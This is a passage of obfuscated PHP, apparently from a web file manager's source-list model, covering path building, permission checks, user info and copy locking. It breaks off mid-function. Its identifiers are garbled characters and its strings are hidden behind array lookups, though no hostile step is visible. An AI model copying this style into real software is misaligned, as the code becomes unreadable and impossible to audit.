$…Ò„¡Ú¹[$™õ¬İ®ô]; $ûïÁÍ­[$ÕŸİñä’[78]] = $ßç¼åìï[$ÕŸİñä’[78]]; $ûïÁÍ­[$ÕŸİñä’[28]] = $ßç¼åìï[$ÕŸİñä’[28]]; if (!isset(self::$cacheFileInfo[$ÕŸİñä’[467] . $™õ¬İ®ô])) { self::$cacheFileInfo[$ÕŸİñä’[467] . $™õ¬İ®ô] = array_merge(array(), $ûïÁÍ­); } unset($…Ò„¡Ú¹[$™õ¬İ®ô][$ÕŸİñä’[76]]); $Š¡Ú¶ = is_array($É£¼É¼—[$™õ¬İ®ô]) ? $É£¼É¼—[$™õ¬İ®ô] : array(); $ßç¼åìï[$ÕŸİñä’[164]] = array_merge($Š¡Ú¶, $…Ò„¡Ú¹[$™õ¬İ®ô]); if (isset($ßç¼åìï[$ÕŸİñä’[164]][$ÕŸİñä’[163]])) { $ßç¼åìï[$ÕŸİñä’[163]] = json_decode($ßç¼åìï[$ÕŸİñä’[164]][$ÕŸİñä’[163]], !0); unset($ßç¼åìï[$ÕŸİñä’[164]][$ÕŸİñä’[163]]); } } unset($ßç¼åìï); } protected function _listAppendSourceInfo(&$ûÄíåÕ·, $†äÎ×ÑÅ) { $ÆÑ¿£ØŠ =& $_SERVER[ÏÒ Ì„]; if (!defined($ÆÑ¿£ØŠ[468])) { return; } $†ÛœìĞÒ = Model($ÆÑ¿£ØŠ[469])->listData(); $³ÖÀ³ü‡ = Model($ÆÑ¿£ØŠ[420])->listData(); $¤¢ÔÖò = Model($ÆÑ¿£ØŠ[410])->listData(); $œëíËÜÙ = Model($ÆÑ¿£ØŠ[470])->listSimple(); $€šÒ÷³œ = array_to_keyvalue($†ÛœìĞÒ, $ÆÑ¿£ØŠ[395]); $´Ú“ö€ú = array_to_keyvalue_group($³ÖÀ³ü‡, $ÆÑ¿£ØŠ[76], $ÆÑ¿£ØŠ[421]); $ŸÒ¼Ç¾ = array_to_keyvalue($¤¢ÔÖò, $ÆÑ¿£ØŠ[76]); $ş—ìúÈ‡ = array_to_keyvalue_group($œëíËÜÙ, $ÆÑ¿£ØŠ[397]); foreach ($ûÄíåÕ· as &$Ìåü’é) { $Ìåü’é[$ÆÑ¿£ØŠ[85]] = array($ÆÑ¿£ØŠ[471] => 0, $ÆÑ¿£ØŠ[472] => 0, $ÆÑ¿£ØŠ[473] => 0); if (isset($ŸÒ¼Ç¾[$Ìåü’é[$ÆÑ¿£ØŠ[397]]])) { $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[474]] = 1; $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[475]] = $ŸÒ¼Ç¾[$Ìåü’é[$ÆÑ¿£ØŠ[397]]][$ÆÑ¿£ØŠ[28]]; } if (isset($´Ú“ö€ú[$Ìåü’é[$ÆÑ¿£ØŠ[397]]])) { $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[476]] = array(); foreach ($´Ú“ö€ú[$Ìåü’é[$ÆÑ¿£ØŠ[397]]] as $Á¡á²ê) { $úÉ¦ĞÃĞ = $€šÒ÷³œ[$Á¡á²ê]; $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[476]][] = array($ÆÑ¿£ØŠ[477] => $úÉ¦ĞÃĞ[$ÆÑ¿£ØŠ[395]], $ÆÑ¿£ØŠ[415] => $úÉ¦ĞÃĞ[$ÆÑ¿£ØŠ[28]], $ÆÑ¿£ØŠ[478] => $úÉ¦ĞÃĞ[$ÆÑ¿£ØŠ[479]]); } } if (isset($ş—ìúÈ‡[$Ìåü’é[$ÆÑ¿£ØŠ[397]]])) { $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[480]] = array(); foreach ($ş—ìúÈ‡[$Ìåü’é[$ÆÑ¿£ØŠ[397]]] as $î£õÚ¥Ê) { $Ìåü’é[$ÆÑ¿£ØŠ[85]][$ÆÑ¿£ØŠ[480]] = array($ÆÑ¿£ØŠ[481] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[482]], $ÆÑ¿£ØŠ[483] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[484]], $ÆÑ¿£ØŠ[485] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[397]], $ÆÑ¿£ØŠ[486] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[487]], $ÆÑ¿£ØŠ[488] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[489]], $ÆÑ¿£ØŠ[490] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[490]], $ÆÑ¿£ØŠ[491] => $î£õÚ¥Ê[$ÆÑ¿£ØŠ[491]]); } } } unset($Ìåü’é); return $ûÄíåÕ·; } protected function _listAppendChildren(&$“óÍ­‘’, $¡Õ¡—³Õ) { $™¸öˆÈ— =& $_SERVER[ÏÒ Ì„]; $ƒÂë¡± = array(); $Àî‹¥Ğî = array($™¸öˆÈ—[203] => 0, $™¸öˆÈ—[204] => 0); foreach ($“óÍ­‘’ as &$´û¼ö½Ğ) { if (!$´û¼ö½Ğ[$™¸öˆÈ—[405]]) { continue; } $ƒÂë¡±[] = $´û¼ö½Ğ[$™¸öˆÈ—[397]]; } unset($´û¼ö½Ğ); if (!$ƒÂë¡±) { return; } $¨“¼Ïà = array($™¸öˆÈ—[492] => array($™¸öˆÈ—[7], $ƒÂë¡±)); $ÛÛÅş¨ı = array($™¸öˆÈ—[492], $™¸öˆÈ—[405], $™¸öˆÈ—[493] => $™¸öˆÈ—[494]); $õ¶—÷îÚ = $this->field($ÛÛÅş¨ı)->where($¨“¼Ïà)->group($™¸öˆÈ—[495])->select(); $¨€¾òº× = array(); foreach ($õ¶—÷îÚ as $ÂıÁß»æ) { $Â‚ à˜ = $ÂıÁß»æ[$™¸öˆÈ—[492]]; $®ªÅ‚É™ = $ÂıÁß»æ[$™¸öˆÈ—[405]] == $™¸öˆÈ—[87] ? $™¸öˆÈ—[204] : $™¸öˆÈ—[203]; if (!isset($¨€¾òº×[$Â‚ à˜])) { $¨€¾òº×[$Â‚ à˜] = array($™¸öˆÈ—[203] => 0, $™¸öˆÈ—[204] => 0); } $¨€¾òº×[$Â‚ à˜][$®ªÅ‚É™] += $ÂıÁß»æ[$™¸öˆÈ—[494]]; } foreach ($“óÍ­‘’ as &$´û¼ö½Ğ) { if (!$´û¼ö½Ğ[$™¸öˆÈ—[405]]) { continue; } $“£é¥ŠÇ = is_array($¨€¾òº×[$´û¼ö½Ğ[$™¸öˆÈ—[397]]]) ? $¨€¾òº×[$´û¼ö½Ğ[$™¸öˆÈ—[397]]] : $Àî‹¥Ğî; $´û¼ö½Ğ[$™¸öˆÈ—[204]] = $“£é¥ŠÇ[$™¸öˆÈ—[204]]; $´û¼ö½Ğ[$™¸öˆÈ—[203]] = $“£é¥ŠÇ[$™¸öˆÈ—[203]]; unset($´û¼ö½Ğ[$™¸öˆÈ—[407]]); } unset($´û¼ö½Ğ); } protected function _listAppendAuth(&$”¨ùÕ”à) { $®ãô©š„ =& $_SERVER[ÏÒ Ì„]; if (!defined($®ãô©š„[468])) { return; } $‚ºëª‘Â = array(); foreach ($”¨ùÕ”à as $Åòóªì„) { if ($Åòóªì„[$®ãô©š„[406]] == self::TYPE_GROUP) { $‚ºëª‘Â[] = $Åòóªì„[$®ãô©š„[397]]; } } if (!$‚ºëª‘Â) { return; } $İªüœİà = array_to_keyvalue($”¨ùÕ”à, $®ãô©š„[397]); $Š¼İšµ = Model($®ãô©š„[496])->getSourceList($‚ºëª‘Â, $İªüœİà); foreach ($”¨ùÕ”à as $›ÔÀ¥ÕÎ => &$Åòóªì„) { $Åòóªì„[$®ãô©š„[408]] = $Š¼İšµ[$Åòóªì„[$®ãô©š„[397]]]; if (!$Åòóªì„[$®ãô©š„[408]] && $Åòóªì„[$®ãô©š„[406]] == self::TYPE_GROUP) { $Åòóªì„[$®ãô©š„[408]] = Action($®ãô©š„[497])->pathGroupAuthMake($Åòóªì„[$®ãô©š„[498]]); if (!$Åòóªì„[$®ãô©š„[408]] && !_get($GLOBALS, $®ãô©š„[499])) { $Åòóªì„[$®ãô©š„[196]] = !1; $Åòóªì„[$®ãô©š„[195]] = !1; } } if ($Åòóªì„[$®ãô©š„[408]]) { $Åòóªì„[$®ãô©š„[196]] = AuthModel::authCheckEdit($Åòóªì„[$®ãô©š„[408]][$®ãô©š„[409]]); $Åòóªì„[$®ãô©š„[195]] = AuthModel::authCheckView($Åòóªì„[$®ãô©š„[408]][$®ãô©š„[409]]); } $this->groupPathDisplay($Åòóªì„); } unset($Åòóªì„); } public function _listAppendAuthSecret(&$“¿•ü»ô) { $ÚËÓ Ñ¼ =& $_SERVER[ÏÒ Ì„]; if (Model($ÚËÓ Ñ¼[427])->get($ÚËÓ Ñ¼[500]) != $ÚËÓ Ñ¼[87]) { return; } static $Æå¦‘éÉ = false; if (!$Æå¦‘éÉ) { $òµøûûé = Model($ÚËÓ Ñ¼[501]); $§õÀ£ç = Model($ÚËÓ Ñ¼[502]); $Æå¦‘éÉ = $§õÀ£ç->listData(); $Æå¦‘éÉ = array_to_keyvalue($Æå¦‘éÉ, $ÚËÓ Ñ¼[397]); $ÔÒ€ÉÊ° = json_decode(Model($ÚËÓ Ñ¼[427])->get($ÚËÓ Ñ¼[503]), !0); $ÔÒ€ÉÊ° = array_to_keyvalue($ÔÒ€ÉÊ°, $ÚËÓ Ñ¼[395]); foreach ($Æå¦‘éÉ as $§èÚ‚¶º => $çßšÒó³) { $èæÜá´Ù = $ÔÒ€ÉÊ°[$çßšÒó³[$ÚËÓ Ñ¼[504]]]; if (!$èæÜá´Ù) { $§õÀ£ç->remove($çßšÒó³[$ÚËÓ Ñ¼[395]]); unset($Æå¦‘éÉ[$§èÚ‚¶º]); continue; } $ìÈë°„ = $òµøûûé->listData($èæÜá´Ù[$ÚËÓ Ñ¼[408]]); if (!$ìÈë°„) { $§õÀ£ç->remove($çßšÒó³[$ÚËÓ Ñ¼[395]]); unset($Æå¦‘éÉ[$§èÚ‚¶º]); continue; } $çßšÒó³[$ÚËÓ Ñ¼[408]] = $ìÈë°„; $çßšÒó³[$ÚËÓ Ñ¼[505]] = $èæÜá´Ù; $çßšÒó³[$ÚËÓ Ñ¼[506]] = Model($ÚËÓ Ñ¼[507])->getInfoSimpleOuter($çßšÒó³[$ÚËÓ Ñ¼[446]]); $Æå¦‘éÉ[$§èÚ‚¶º] = $çßšÒó³; } } $’¹‘Ê‚½ = defined($ÚËÓ Ñ¼[508]) ? USER_ID : $ÚËÓ Ñ¼[33]; $Ñ¨‡Ìéì = array(); $×òÂ¾èì = $this->_listAppendPath($Ñ¨‡Ìéì, !0); foreach ($“¿•ü»ô as $§èÚ‚¶º => &$çßšÒó³) { if (!is_array($çßšÒó³[$ÚËÓ Ñ¼[408]])) { continue; } if ($çßšÒó³[$ÚËÓ Ñ¼[406]] != $ÚËÓ Ñ¼[509]) { continue; } if (isset($Æå¦‘éÉ[$çßšÒó³[$ÚËÓ Ñ¼[397]]])) { $Â»ôıÄÉ = $Æå¦‘éÉ[$çßšÒó³[$ÚËÓ Ñ¼[397]]]; if (!is_array($çßšÒó³[$ÚËÓ Ñ¼[459]])) { $çßšÒó³[$ÚËÓ Ñ¼[459]] = array(); } $çßšÒó³[$ÚËÓ Ñ¼[459]][$ÚËÓ Ñ¼[510]] = $Â»ôıÄÉ[$ÚËÓ Ñ¼[504]]; $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[511]] = $Â»ôıÄÉ; $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[512]] = $çßšÒó³[$ÚËÓ Ñ¼[513]]; $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[514]] = $ÚËÓ Ñ¼[87]; if ($Â»ôıÄÉ[$ÚËÓ Ñ¼[446]] != $’¹‘Ê‚½) { $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[409]] = $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[409]] & $Â»ôıÄÉ[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[408]]; } continue; } $£ôæà‘» = $this->parentLevelArray($çßšÒó³[$ÚËÓ Ñ¼[515]]); $Æ…‡ÈØ§ = array_reverse($£ôæà‘»); foreach ($Æ…‡ÈØ§ as $ã­¬ãõ‘ => $Íñƒ×Ğ) { if (!isset($Æå¦‘éÉ[$Íñƒ×Ğ])) { continue; } $Â»ôıÄÉ = $Æå¦‘éÉ[$Íñƒ×Ğ]; $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[511]] = $Â»ôıÄÉ; if ($Â»ôıÄÉ[$ÚËÓ Ñ¼[446]] != $’¹‘Ê‚½) { $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[409]] = $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[409]] & $Â»ôıÄÉ[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[408]]; } $ä½ºÅºÖ = $ÚËÓ Ñ¼[33]; $óÑû”Ğ„ = count($£ôæà‘») - $ã­¬ãõ‘; for ($Ûæåš² = 0; $Ûæåš² < $óÑû”Ğ„; $Ûæåš²++) { if (!isset($×òÂ¾èì[$£ôæà‘»[$Ûæåš²]])) { $ä½ºÅºÖ = $ÚËÓ Ñ¼[33]; break; } $ä½ºÅºÖ = $ä½ºÅºÖ . rtrim($×òÂ¾èì[$£ôæà‘»[$Ûæåš²]], $ÚËÓ Ñ¼[8]) . $ÚËÓ Ñ¼[8]; } $çßšÒó³[$ÚËÓ Ñ¼[408]][$ÚËÓ Ñ¼[512]] = rtrim($ä½ºÅºÖ, $ÚËÓ Ñ¼[8]) . $ÚËÓ Ñ¼[8]; break; } } unset($çßšÒó³); } public function groupPathDisplay(&$èùñ‡Ã®) { $Õ·ª× =& $_SERVER[ÏÒ Ì„]; if ($èùñ‡Ã®[$Õ·ª×[406]] != self::TYPE_GROUP) { return; } $¬èù÷¶© = Model($Õ·ª×[516])->getInfo($èùñ‡Ã®[$Õ·ª×[498]]); $²€¯£“ = $this->parentLevelArray($¬èù÷¶©[$Õ·ª×[515]]); $¹¦š‘«û = $Õ·ª×[33]; foreach ($²€¯£“ as $õúûúüÎ) { $òÈ³¥û = Model($Õ·ª×[516])->getInfo($õúûúüÎ); $¹¦š‘«û .= $òÈ³¥û[$Õ·ª×[85]][$Õ·ª×[397]] . $Õ·ª×[47]; } $èùñ‡Ã®[$Õ·ª×[517]] = $¬èù÷¶©[$Õ·ª×[492]]; $èùñ‡Ã®[$Õ·ª×[518]] = $¬èù÷¶©[$Õ·ª×[515]]; $èùñ‡Ã®[$Õ·ª×[519]] = $¬èù÷¶©[$Õ·ª×[520]]; $èùñ‡Ã®[$Õ·ª×[521]] = $¹¦š‘«û . $¬èù÷¶©[$Õ·ª×[85]][$Õ·ª×[397]]; } protected function _listAppendPath(&$Ÿ“àğÈ…, $ÖÂ‘™÷˜ = false) { $ê©÷ŞÍ =& $_SERVER[ÏÒ Ì„]; static $Äşú“˜ì = array(); $ëäˆˆÈ« = array(); $ää¾†Ê = array(); if ($ÖÂ‘™÷˜) { return $Äşú“˜ì; } foreach ($Ÿ“àğÈ… as &$ú†ºšÙØ) { $Ì‚È¬²¾ = $ú†ºšÙØ[$ê©÷ŞÍ[397]]; if ($ú†ºšÙØ[$ê©÷ŞÍ[405]] == $ê©÷ŞÍ[87] && $ú†ºšÙØ[$ê©÷ŞÍ[492]] != 0) { $Äşú“˜ì[$Ì‚È¬²¾] = $ú†ºšÙØ[$ê©÷ŞÍ[28]]; } if ($ú†ºšÙØ[$ê©÷ŞÍ[405]] == $ê©÷ŞÍ[87] && $ú†ºšÙØ[$ê©÷ŞÍ[492]] == 0 && !isset($Äşú“˜ì[$Ì‚È¬²¾])) { $Äşú“˜ì[$Ì‚È¬²¾] = $this->_listAppendPathRoot($ú†ºšÙØ, array()); } if (isset($ää¾†Ê[$ú†ºšÙØ[$ê©÷ŞÍ[515]]])) { continue; } $ää¾†Ê[$ú†ºšÙØ[$ê©÷ŞÍ[515]]] = !0; $ñü¡Áòã = $this->parentLevelArray($ú†ºšÙØ[$ê©÷ŞÍ[515]]); foreach ($ñü¡Áòã as $”Éü– => $†øÄ£×Õ) { if (isset($Äşú“˜ì[$†øÄ£×Õ])) { continue; } if ($”Éü– == 0) { $Äşú“˜ì[$†øÄ£×Õ] = $this->_listAppendPathRoot($ú†ºšÙØ, $ñü¡Áòã); } if ($”Éü– != 0) { $ëäˆˆÈ«[] = $†øÄ£×Õ; } } } unset($ú†ºšÙØ); $ëäˆˆÈ« = array_unique($ëäˆˆÈ«); if (count($ëäˆˆÈ«) > 0) { $±ÇŸÇŠ¿ = array($ê©÷ŞÍ[412] => array($ê©÷ŞÍ[413], $ëäˆˆÈ«)); if (count($ëäˆˆÈ«) == 1) { $ŒÈúš°Š = $this->sourceInfo($ëäˆˆÈ«[0]); $ûÃˆîí­ = is_array($ŒÈúš°Š) ? array($ŒÈúš°Š) : !1; } else { $ûÃˆîí­ = $this->field($ê©÷ŞÍ[522])->where($±ÇŸÇŠ¿)->select(); } if (!$ûÃˆîí­) { $ûÃˆîí­ = array(); } foreach ($ûÃˆîí­ as $Ùıš‡ó‚) { $Äşú“˜ì[$Ùıš‡ó‚[$ê©÷ŞÍ[397]]] = $Ùıš‡ó‚[$ê©÷ŞÍ[28]]; } } $§òÆÎˆÒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $à‚Øé×Ù = array(); foreach ($Ÿ“àğÈ… as &$ú†ºšÙØ) { $Â¢ò´ö = $ú†ºšÙØ[$ê©÷ŞÍ[515]]; $ê¤Š¶Ò = $ê©÷ŞÍ[33]; if (isset($à‚Øé×Ù[$Â¢ò´ö])) { $ê¤Š¶Ò = $à‚Øé×Ù[$Â¢ò´ö]; } else { $ñü¡Áòã = $this->parentLevelArray($ú†ºšÙØ[$ê©÷ŞÍ[515]]); foreach ($ñü¡Áòã as $”Éü– => $†øÄ£×Õ) { if (isset($Äşú“˜ì[$†øÄ£×Õ])) { $ê¤Š¶Ò .= $Äşú“˜ì[$†øÄ£×Õ] . $ê©÷ŞÍ[8]; } } $à‚Øé×Ù[$Â¢ò´ö] = $ê¤Š¶Ò; } $ê¤Š¶Ò .= $ú†ºšÙØ[$ê©÷ŞÍ[28]]; if ($ú†ºšÙØ[$ê©÷ŞÍ[405]] == $ê©÷ŞÍ[87]) { $ê¤Š¶Ò .= $ê©÷ŞÍ[8]; } $ú†ºšÙØ[$ê©÷ŞÍ[513]] = str_replace($ê©÷ŞÍ[523], $ê©÷ŞÍ[8], $ê¤Š¶Ò); if ($ú†ºšÙØ[$ê©÷ŞÍ[492]] == $ê©÷ŞÍ[191]) { $ú†ºšÙØ[$ê©÷ŞÍ[28]] = trim($Äşú“˜ì[$ú†ºšÙØ[$ê©÷ŞÍ[397]]], $ê©÷ŞÍ[8]); $ú†ºšÙØ[$ê©÷ŞÍ[513]] = $ú†ºšÙØ[$ê©÷ŞÍ[28]] . $ê©÷ŞÍ[8]; } if (intval($ú†ºšÙØ[$ê©÷ŞÍ[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ú†ºšÙØ, $ñü¡Áòã, $§òÆÎˆÒ); } } unset($ú†ºšÙØ); return $Ÿ“àğÈ…; } private function _listAppendPathRecycle(&$¾Â¢ìµ, $ şŠı¿Ú, $çÎŞóøŒ) { $ÀúÑ‡¬¿ =& $_SERVER[ÏÒ Ì„]; if (!in_array($çÎŞóøŒ, $ şŠı¿Ú) && $¾Â¢ìµ[$ÀúÑ‡¬¿[397]] != $çÎŞóøŒ) { return; } $ëÊóòÅ = explode($ÀúÑ‡¬¿[8], trim($¾Â¢ìµ[$ÀúÑ‡¬¿[513]], $ÀúÑ‡¬¿[8])); $Ğ­‚ß¶§ = implode($ÀúÑ‡¬¿[8], array_slice($ëÊóòÅ, 2)); $¾Â¢ìµ[$ÀúÑ‡¬¿[513]] = $ÀúÑ‡¬¿[8] . LNG($ÀúÑ‡¬¿[524]) . $ÀúÑ‡¬¿[8] . ltrim($Ğ­‚ß¶§, $ÀúÑ‡¬¿[8]); $¾Â¢ìµ[$ÀúÑ‡¬¿[515]] = $ÀúÑ‡¬¿[525] . implode($ÀúÑ‡¬¿[47], array_slice($ şŠı¿Ú, 1)) . $ÀúÑ‡¬¿[47]; if ($¾Â¢ìµ[$ÀúÑ‡¬¿[397]] == $çÎŞóøŒ) { $¾Â¢ìµ[$ÀúÑ‡¬¿[515]] = $ÀúÑ‡¬¿[525]; $¾Â¢ìµ[$ÀúÑ‡¬¿[492]] = $ÀúÑ‡¬¿[191]; $¾Â¢ìµ[$ÀúÑ‡¬¿[28]] = LNG($ÀúÑ‡¬¿[524]); } $¾Â¢ìµ[$ÀúÑ‡¬¿[526]] = $ÀúÑ‡¬¿[527]; } protected function _listAppendPathRoot(&$Ó³ì…Ğ¾, $ŸŸ”óÄÃ) { $¾”ØöŠæ =& $_SERVER[ÏÒ Ì„]; $ƒØ®Şô¼ = $¾”ØöŠæ[33]; if ($Ó³ì…Ğ¾[$¾”ØöŠæ[406]] == self::TYPE_USER) { if (defined($¾”ØöŠæ[468]) && $Ó³ì…Ğ¾[$¾”ØöŠæ[498]] == USER_ID) { $ƒØ®Şô¼ = LNG($¾”ØöŠæ[528]); if (!$ŸŸ”óÄÃ) { $Ó³ì…Ğ¾[$¾”ØöŠæ[28]] = $ƒØ®Şô¼; } } else { $Û²¥ÑÅŒ = Model($¾”ØöŠæ[507])->getInfoSimple($Ó³ì…Ğ¾[$¾”ØöŠæ[498]]); $ƒØ®Şô¼ = LNG($¾”ØöŠæ[529]) . $¾”ØöŠæ[160] . $Û²¥ÑÅŒ[$¾”ØöŠæ[28]] . $¾”ØöŠæ[530]; } } else { if ($Ó³ì…Ğ¾[$¾”ØöŠæ[406]] == self::TYPE_GROUP) { $Û²¥ÑÅŒ = Model($¾”ØöŠæ[516])->getInfoSimple($Ó³ì…Ğ¾[$¾”ØöŠæ[498]]); $ƒØ®Şô¼ = $Û²¥ÑÅŒ[$¾”ØöŠæ[28]]; } else { if ($Ó³ì…Ğ¾[$¾”ØöŠæ[406]] == self::TYPE_SYSTEM) { $ƒØ®Şô¼ = $¾”ØöŠæ[531]; } } } $ƒØ®Şô¼ = $ƒØ®Şô¼ ? $¾”ØöŠæ[8] . $ƒØ®Şô¼ . $¾”ØöŠæ[8] : $¾”ØöŠæ[8]; return $ƒØ®Şô¼; } protected function _listAppendUser(&$ÎŸ³¯™ñ) { $ƒÑ·¾¯— =& $_SERVER[ÏÒ Ì„]; $»Øä¹âã = array_to_keyvalue($ÎŸ³¯™ñ, $ƒÑ·¾¯—[33], $ƒÑ·¾¯—[446]); $†¢ÀÊ¿ƒ = array_to_keyvalue($ÎŸ³¯™ñ, $ƒÑ·¾¯—[33], $ƒÑ·¾¯—[448]); $×¹–ı‹£ = array_merge($»Øä¹âã, $†¢ÀÊ¿ƒ); $§İşªˆê = Model($ƒÑ·¾¯—[532])->userListInfo($×¹–ı‹£); foreach ($ÎŸ³¯™ñ as &$Ùè®©ÜÃ) { $ƒ‚Íô£ = $Ùè®©ÜÃ[$ƒÑ·¾¯—[446]]; $Ùè®©ÜÃ[$ƒÑ·¾¯—[446]] = $§İşªˆê[$ƒ‚Íô£] ? $§İşªˆê[$ƒ‚Íô£] : !1; $ƒ‚Íô£ = $Ùè®©ÜÃ[$ƒÑ·¾¯—[448]]; $Ùè®©ÜÃ[$ƒÑ·¾¯—[448]] = $§İşªˆê[$ƒ‚Íô£] ? $§İşªˆê[$ƒ‚Íô£] : !1; if (isset($Ùè®©ÜÃ[$ƒÑ·¾¯—[459]]) && $Ùè®©ÜÃ[$ƒÑ·¾¯—[459]][$ƒÑ·¾¯—[533]]) { $Á©ˆÄ¥ = $GLOBALS[$ƒÑ·¾¯—[6]][$ƒÑ·¾¯—[88]][$ƒÑ·¾¯—[534]]; if ($Ùè®©ÜÃ[$ƒÑ·¾¯—[459]][$ƒÑ·¾¯—[535]] <= time() - $Á©ˆÄ¥) { $this->metaSet($Ùè®©ÜÃ[$ƒÑ·¾¯—[397]], $ƒÑ·¾¯—[533], null); $this->metaSet($Ùè®©ÜÃ[$ƒÑ·¾¯—[397]], $ƒÑ·¾¯—[535], null); unset($Ùè®©ÜÃ[$ƒÑ·¾¯—[459]][$ƒÑ·¾¯—[533]]); continue; } $ëš“úšü = $Ùè®©ÜÃ[$ƒÑ·¾¯—[459]][$ƒÑ·¾¯—[533]]; $Ùè®©ÜÃ[$ƒÑ·¾¯—[459]][$ƒÑ·¾¯—[536]] = Model($ƒÑ·¾¯—[532])->getInfoSimpleOuter($ëš“úšü); } } unset($Ùè®©ÜÃ); } public function parentLevelArray($¹®ÔîÕä) { $÷ÈÜÊ±• =& $_SERVER[ÏÒ Ì„]; $¹®ÔîÕä = explode($÷ÈÜÊ±•[47], trim($¹®ÔîÕä, $÷ÈÜÊ±•[47])); return array_remove_value($¹®ÔîÕä, $÷ÈÜÊ±•[191]); } public function listAll($ß±š‘‰¢) { $‹ØÖç—È =& $_SERVER[ÏÒ Ì„]; $±••±© = $this->sourceInfo($ß±š‘‰¢); $ø£‚“Ô = array($‹ØÖç—È[537] => array($‹ØÖç—È[538], $±••±©[$‹ØÖç—È[515]] . $ß±š‘‰¢ . $‹ØÖç—È[539]), $‹ØÖç—È[540] => 0); $ƒÓè„²ü = $‹ØÖç—È[541]; $ª£Ø¸ŸÍ = "\x4c\105\106\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\151\157\137\x66\x69\154\145\40\x66\x69\154\x65\x20\157\x6e\x20\x73\157\x75\x72\143\145\x2e\x66\x69\154\x65\111\104\40\75\x20\x66\151\x6c\x65\56\146\x69\154\x65\x49\x44"; $¨ÙØ¿Ä­ = $this->alias($‹ØÖç—È[438])->field($ƒÓè„²ü)->where($ø£‚“Ô)->join($ª£Ø¸ŸÍ)->select(); $this->_listAppendAuth($¨ÙØ¿Ä­); $this->_listAppendUser($¨ÙØ¿Ä­); $this->_listAppendPath($¨ÙØ¿Ä­); $¨ÙØ¿Ä­ = array_to_keyvalue($¨ÙØ¿Ä­, $‹ØÖç—È[397]); $İ¤Ô‡Ğæ = "\x2f{$±••±©[$‹ØÖç—È[28]]}\57"; $İ¤Ô‡Ğæ = $İ¤Ô‡Ğæ == $‹ØÖç—È[523] ? $‹ØÖç—È[8] : $İ¤Ô‡Ğæ; $õñßº× = array(); foreach ($¨ÙØ¿Ä­ as $ÙŒ²Úµ« => $ÈÏÔÍß¶) { $††ÀŠß‚ = $this->parentLevelArray($ÈÏÔÍß¶[$‹ØÖç—È[515]]); array_shift($††ÀŠß‚); $ÍŞ¥¢Ş = $İ¤Ô‡Ğæ; for ($ıü®¹× = 0; $ıü®¹× < count($††ÀŠß‚); $ıü®¹×++) { $ÍŞ¥¢Ş .= $¨ÙØ¿Ä­[$††ÀŠß‚[$ıü®¹×]][$‹ØÖç—È[28]] . $‹ØÖç—È[8]; } $ÍŞ¥¢Ş .= $ÈÏÔÍß¶[$‹ØÖç—È[28]]; if ($ÈÏÔÍß¶[$‹ØÖç—È[405]]) { $ÍŞ¥¢Ş .= $‹ØÖç—È[8]; } $ÍŞ¥¢Ş = str_replace($‹ØÖç—È[523], $‹ØÖç—È[8], $ÍŞ¥¢Ş); $ÍŞ¥¢Ş = str_replace($‹ØÖç—È[523], $‹ØÖç—È[8], $ÍŞ¥¢Ş); $šĞÕØÙì = array($‹ØÖç—È[416] => str_replace($‹ØÖç—È[523], $‹ØÖç—È[8], $ÍŞ¥¢Ş), $‹ØÖç—È[542] => intval($ÈÏÔÍß¶[$‹ØÖç—È[405]]), $‹ØÖç—È[85] => $this->pathInfoFilter($ÈÏÔÍß¶)); if (!$ÈÏÔÍß¶[$‹ØÖç—È[405]]) { $šĞÕØÙì[$‹ØÖç—È[461]] = $ÈÏÔÍß¶[$‹ØÖç—È[461]]; $šĞÕØÙì[$‹ØÖç—È[86]] = $ÈÏÔÍß¶[$‹ØÖç—È[76]]; } $õñßº×[] = $šĞÕØÙì; } return $õñßº×; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($º‘Ãæ©í) { $ë††Èû =& $_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $this->_lockCheck($ë††Èû[543], $º‘Ãæ©í); $ÙÀö±„‘ = 1; $this->_lockEvent($º‘Ãæ©í, array($ë††Èû[544], $ë††Èû[545]), $ÙÀö±„‘); $this->_lockParent($º‘Ãæ©í, array($ë††Èû[545]), $ÙÀö±„‘); $this->_lockEvent($º‘Ãæ©í, array($ë††Èû[546], $ë††Èû[547]), $ÙÀö±„‘); $this->_lockCheckEnd($ë††Èû[543], $º‘Ãæ©í); } public function lockCopyEnd($üÄıÊêÃ) { $İ•ıı“¬ =& $_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $ÅÏÌÏ¤ş = 0; $this->_lockEvent($üÄıÊêÃ, array($İ•ıı“¬[544], $İ•ıı“¬[545]), $ÅÏÌÏ¤ş); $this->_lockParent($üÄıÊêÃ, array($İ•ıı“¬[545]), $ÅÏÌÏ¤ş); $this->_lockEvent($üÄıÊêÃ, array($İ•ıı“¬[546], $İ•ıı“¬[547]), $ÅÏÌÏ¤ş); } public function lockWriteStart($ƒ¬Ş•Ä®, $—à…®Ø = '') { $ÇûŸÒË =& 